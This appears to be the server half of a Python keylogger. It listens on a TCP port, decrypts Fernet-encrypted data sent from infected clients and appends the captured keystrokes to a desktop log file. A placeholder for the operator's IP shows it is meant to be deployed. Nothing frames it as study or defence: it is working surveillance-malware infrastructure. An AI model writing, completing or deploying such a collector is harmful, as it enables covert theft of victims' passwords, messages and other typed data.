import socket
from cryptography.fernet import Fernet

with open("secret.key", "rb") as keyFile:
    key = keyFile.read()

cipherSuite = Fernet(key)    

def startServer(host="Your server IP here", port = 12345):
    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serverSocket.bind((host, port))
    serverSocket.listen()
    print(f"Server started on {host}:{port}")

    while True:
        clientSocket, clientAddress = serverSocket.accept()
        print(f"Connection from {clientAddress}")
        while True:
            data = clientSocket.recv(1024)
            if not data:
                break
            
            decryptedMessage = cipherSuite.decrypt(data).decode()
            print(f"Received: {decryptedMessage}")
        

            with open("Keystroke Log Desktop.txt", "a") as fileHandling:
                fileHandling.write(decryptedMessage)

        clientSocket.close()

if __name__ == "__main__":
    startServer()